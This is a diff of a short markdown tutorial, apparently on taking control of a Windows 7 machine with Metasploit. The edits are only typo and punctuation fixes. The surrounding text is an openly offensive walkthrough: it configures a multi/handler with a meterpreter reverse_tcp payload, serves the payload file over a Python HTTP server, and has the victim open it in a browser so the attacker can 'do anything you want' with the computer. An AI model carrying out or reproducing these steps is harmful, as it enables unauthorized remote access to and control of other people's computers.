@@ -13,9 +13,9 @@ OS Windows 7
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
 Configure the settings
-<code>show options</code> and <code>exploit</code>
+<code>show options</code> and <code>exploit</code>.
 
-#### 3. ITs necesary to execute the file on the victim's computer ####
+#### 3. It's necesary to execute the file on the victim's computer ####
 Use <code>python -m SimpleHTTPServer 80</code> to have an easy acces to your file wihtout the need of download it.
 Run your file through any browser on victim's computer using your IP and the connection should be established.
 
@@ -27,7 +27,7 @@ Then do anything you want with the computer's victim, remember alway use:
 
 >   <code>sessions</code> list all the active sessions.
 
->   <code>exploit</code> or <code>run</code> execute the exploit
+>   <code>exploit</code> or <code>run</code> execute the exploit.
 
 
 
